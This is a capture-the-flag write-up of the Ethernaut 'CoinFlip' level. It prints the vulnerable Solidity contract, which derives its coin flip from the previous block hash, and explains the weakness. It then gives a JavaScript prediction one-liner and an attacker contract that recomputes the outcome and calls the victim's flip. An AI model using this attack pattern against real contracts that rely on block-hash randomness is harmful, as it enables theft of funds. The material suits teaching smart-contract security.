# CoinFlip

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```solidity
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Let's try to understand what's happening here. The `flip` method gets the hash of the previous block, does integer division on it by a fixed factor and then uses the result as the side of the coin. The factor in hexadecimal is `0x8000000000000000000000000000000000000000000000000000000000000000`. The probability that the hash of some random block is higher (or lower) than this number is 50%, so it makes sense to call it a "coin flip", where the coin is given by the previous block hash.

But if that's the case we can easily predict the next flip by doing the same check on our side.

```javascript
let blockHash = function() {
  return new Promise(
    (resolve, reject) => web3.eth.getBlock('latest', (error, result) => {
      if(!error)
          resolve(result['hash']);
      else
          reject(error);
    })
  );
}

contract.flip(parseInt((await blockHash())[2], 16) > 8)
```

The problem is to make sure that a new block doesn't get mined before we submit our guess. The whole process is highly unstable. We also can't toss two flips in the same block because of the `if (lastHash == blockValue)` check. We need another approach.

What if we have a contract which guesses the right flip? The transactions are guaranteed to be in the same block, so we can't be wrong. Let's try:

```solidity
pragma solidity ^0.4.18;

contract CoinFlip {

  function flip(bool _guess) public returns (bool);

}

contract Caller {
    CoinFlip k;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address victim) public {
        k = CoinFlip(victim);
    }

    function guessFlip() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;

        k.flip(side);
    }
}
```

We deploy the contract and calmly call `guessFlip` 10 times in a row. It works as expected.
